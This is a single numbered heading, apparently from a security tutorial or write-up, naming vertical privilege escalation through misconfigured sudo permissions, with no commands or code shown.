2. Vertical privilege escalation via misconfigurated Sudo permission